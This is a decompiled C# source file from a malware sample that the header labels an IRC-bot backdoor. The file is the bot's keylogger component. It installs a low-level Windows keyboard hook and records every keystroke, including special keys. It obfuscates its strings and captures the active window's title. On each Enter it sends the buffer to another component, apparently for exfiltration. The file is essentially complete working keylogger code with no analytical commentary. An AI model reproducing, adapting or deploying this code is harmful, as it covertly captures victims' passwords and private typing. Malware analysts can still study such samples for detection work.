// Decompiled with JetBrains decompiler
// Type: 
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal class \uE00E
{
  private const int \uE007 = 13;
  private const int \uE006 = 256;
  private static System.Timers.Timer \uE005 = new System.Timers.Timer();
  private static StringBuilder \uE004 = new StringBuilder();
  private static bool \uE003 = false;
  private static bool \uE002 = false;
  private static \uE00E.\uE000 \uE001 = new \uE00E.\uE000(\uE00E.\uE000);
  private static IntPtr \uE000 = IntPtr.Zero;

  public static void \uE000() => \uE00E.\uE000 = \uE00E.\uE000(\uE00E.\uE001);

  [DllImport("user32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr \uE000(
    int _param0,
    \uE00E.\uE000 _param1,
    IntPtr _param2,
    uint _param3);

  [DllImport("user32.dll", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool \uE000(IntPtr _param0);

  [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr \uE000(
    IntPtr _param0,
    int _param1,
    IntPtr _param2,
    IntPtr _param3);

  [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr \uE000(string _param0);

  private static IntPtr \uE000(\uE00E.\uE000 _param0)
  {
    using (Process currentProcess = Process.GetCurrentProcess())
    {
      using (ProcessModule mainModule = currentProcess.MainModule)
        return \uE00E.\uE000(13, _param0, \uE00E.\uE000(mainModule.ModuleName), 0U);
    }
  }

  private static IntPtr \uE000(int _param0, IntPtr _param1, IntPtr _param2)
  {
    try
    {
      if (_param0 >= 0)
      {
        int num = Marshal.ReadInt32(_param2);
        switch (num)
        {
          case 160:
          case 161:
            \uE00E.\uE003 = _param1 == (IntPtr) 256;
            break;
          default:
            if (_param1 == (IntPtr) 256)
            {
              switch (num)
              {
                case 8:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uF0BB\uF0C0\uF0BA\uF0D9\uF0BA\uF0C6\uF0BB", 61595));
                  break;
                case 13:
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.Append(\uE01B.\uE000("\uE47B", 58400));
                  stringBuilder.Append(\uE00E.\uE004.ToString());
                  stringBuilder.Append(\uE01B.\uE000("\uE788\uE7F5\uE7BC\uE7BB\uE7F5", 59349) + \uE00E.\uE000());
                  \uE00E.\uE004.Remove(0, \uE00E.\uE004.Length);
                  \uE014.\uE001(stringBuilder.ToString());
                  break;
                case 20:
                  \uE00E.\uE002 = !\uE00E.\uE002;
                  break;
                case 32:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE372", 58194));
                  break;
                case 48:
                case 96:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uF8F8", 63688));
                  break;
                case 49:
                case 97:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE1A2", 57747));
                  break;
                case 50:
                case 98:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uECEE", 60636));
                  break;
                case 51:
                case 99:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE7AC", 59295));
                  break;
                case 52:
                case 100:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE1BD", 57737));
                  break;
                case 53:
                case 101:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uF44F", 62586));
                  break;
                case 54:
                case 102:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE4B7", 58497));
                  break;
                case 55:
                case 103:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE3E4", 58323));
                  break;
                case 56:
                case 104:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uF726", 63262));
                  break;
                case 57:
                case 105:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uE266", 57951));
                  break;
                case 91:
                  \uE00E.\uE004.Append(\uE01B.\uE000("\uF0A6\uF0DC\uF0B1\uF0AA\uF0B4\uF0B3\uF0DC\uF0A0", 61693));
                  break;
                default:
                  if (\uE00E.\uE003)
                  {
                    if (!\uE00E.\uE002)
                    {
                      string upper = ((Keys) num).ToString().ToUpper();
                      if (upper.Length > 1)
                      {
                        \uE00E.\uE004.Append(\uE01B.\uE000("\uE47B", 58400) + upper + \uE01B.\uE000("\uED5E", 60675));
                        break;
                      }
                      \uE00E.\uE004.Append(upper);
                      break;
                    }
                    string lower = ((Keys) num).ToString().ToLower();
                    if (lower.Length > 1)
                    {
                      \uE00E.\uE004.Append(\uE01B.\uE000("\uE47B", 58400) + lower + \uE01B.\uE000("\uED5E", 60675));
                      break;
                    }
                    \uE00E.\uE004.Append(lower);
                    break;
                  }
                  if (\uE00E.\uE002)
                  {
                    string upper = ((Keys) num).ToString().ToUpper();
                    if (upper.Length > 1)
                    {
                      \uE00E.\uE004.Append(\uE01B.\uE000("\uE47B", 58400) + upper + \uE01B.\uE000("\uED5E", 60675));
                      break;
                    }
                    \uE00E.\uE004.Append(upper);
                    break;
                  }
                  string lower1 = ((Keys) num).ToString().ToLower();
                  if (lower1.Length > 1)
                  {
                    \uE00E.\uE004.Append(\uE01B.\uE000("\uE47B", 58400) + lower1 + \uE01B.\uE000("\uED5E", 60675));
                    break;
                  }
                  \uE00E.\uE004.Append(lower1);
                  break;
              }
            }
            else
              break;
            break;
        }
      }
    }
    catch
    {
    }
    return \uE00E.\uE000(\uE00E.\uE000, _param0, _param1, _param2);
  }

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
  private static extern int \uE000();

  [DllImport("user32.dll", EntryPoint = "GetWindowText")]
  private static extern int \uE000(int _param0, StringBuilder _param1, int _param2);

  private static string \uE000()
  {
    StringBuilder stringBuilder = new StringBuilder(256);
    try
    {
      \uE00E.\uE000(\uE00E.\uE000(), stringBuilder, 256);
    }
    catch
    {
      stringBuilder.Append(\uE01B.\uE000("\uE457\uE450\uE458\uE45D\uE454\uE455\uE411\uE456\uE454\uE445\uE445\uE458\uE45F\uE456\uE411\uE445\uE459\uE450\uE445\uE411\uE442\uE45E\uE443\uE443\uE448", 58417));
    }
    return stringBuilder.ToString();
  }

  private delegate IntPtr \uE000(int nCode, IntPtr wParam, IntPtr lParam);
}
